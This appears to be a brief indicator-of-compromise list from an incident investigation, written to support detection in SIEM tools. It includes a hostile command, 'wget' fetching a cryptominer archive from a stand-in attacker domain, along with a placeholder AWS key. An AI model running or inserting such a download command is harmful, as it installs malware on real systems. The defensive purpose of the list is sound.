# Indicator of Compromise (IOC) Dump – DroneCropForensics Incident

Here are all the IOCs found during this investigation to help detect and block the attacker:

- **Malicious IP Address:** 91.203.119.5  
- **Malicious Domain:** badsite.example.com  
- **Deleted File:** /var/www/html/api/upload.php  
- **Leaked AWS Key:** AWS_SECRET_ACCESS_KEY=AKIA1234FAKEKEYYO  
- **Malicious Command:** wget http://badsite.example.com/cryptominer.tar.gz

## How I Collected These IOCs

I pulled these from the logs and analysis done during the project, including CloudTrail events, auth logs, and shell history. I also checked public threat intel to confirm the bad domain.

## How These Help

You can use these indicators in SIEM tools or network monitors to detect suspicious activity and respond faster.
